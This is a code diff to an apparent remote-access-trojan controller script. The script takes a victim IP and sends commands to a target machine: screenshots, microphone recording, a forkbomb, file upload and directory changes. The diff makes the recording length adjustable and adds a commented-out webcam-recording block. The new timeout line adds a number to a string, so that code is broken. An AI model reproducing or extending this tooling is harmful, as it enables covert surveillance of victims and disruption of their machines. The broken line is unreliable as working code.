@@ -14,11 +14,11 @@ _github = "https://github.com/JosephFrankFir/Rxploit"
 ap = argparse.ArgumentParser()
 ap.add_argument("-rh", "--rhost", required=True, help="Victim ip")
 ap.add_argument("-p", "--port", required=True, help="Port")
-ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
+# ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
 args = vars(ap.parse_args())
 
-if args['lhost']:
-    LHOST = str(args['lhost'])
+# if args['lhost']:
+#     LHOST = str(args['lhost'])
 if args['rhost']:
     RHOST = str(args['rhost'])
 if args['port']:
@@ -69,12 +69,12 @@ def target_reqs():
          print(termcolor.colored('[-] Goodbye', 'red'))
          break
       elif cmd == 'help':
-         print(termcolor.colored("""\n
+          print(termcolor.colored("""
          exit                                   # Exit Session With The Target
          clear                                  # Clear The Screen
          screenshot                             # Take a Screenshot of The Target Machine
-         record                                 # Record a file using Target Machine microphone, for 20 seconds only
-         frokbomb                               # Send Frokbomb To The Target Machine
+         record *seconds*                       # Record a file using Target Machine microphone
+         forkbomb                               # Send forkbomb To The Target Machine
          sysinfo                                # Get Target Machine Info
          cd *Dir Name*                          # Changes Directory On Target Machine
          upload *File Name*                     # Upload File To The Target Machine
@@ -115,9 +115,10 @@ def target_reqs():
           os.replace("screenshot%d.png" % (count), "images/screenshot%d.png" % (count))
           count += 1
           print(termcolor.colored('[+] Done screenshot saved', 'green'))
-      elif cmd == 'record':
+      elif cmd[:6] == 'record':
           f = open('recorded%d.wav' % (count), 'wb')
-          target.settimeout(27)
+          _timeout = cmd[7:] + 7
+          target.settimeout(_timeout)
           chunk = target.recv(1024)
           while chunk:
               f.write(chunk)
@@ -127,9 +128,24 @@ def target_reqs():
                   break
           target.settimeout(None)
           f.close()
-          os.replace("recorded%d.wav" % (count), "images/recorded%d.wav" % (count))
+          os.replace("recorded%d.wav" % (count), "recordings/recorded%d.wav" % (count))
           count += 1
           print(termcolor.colored('[+] Done recorded file', 'green'))
+      # elif cmd == 'record_cam':
+      #     f = open('cam_record%d.mp4' % (count), 'wb')
+      #     target.settimeout(27)
+      #     chunk = target.recv(1024)
+      #     while chunk:
+      #         f.write(chunk)
+      #         try:
+      #             chunk = target.recv(1024)
+      #         except socket.timeout as e:
+      #             break
+      #     target.settimeout(None)
+      #     f.close()
+      #     os.replace("cam_record%d.mp4" % (count), "recordings/recorded%d.wav" % (count))
+      #     count += 1
+      #     print(termcolor.colored('[+] Done recorded file', 'green'))
 
       # TODO addming record screen function
 
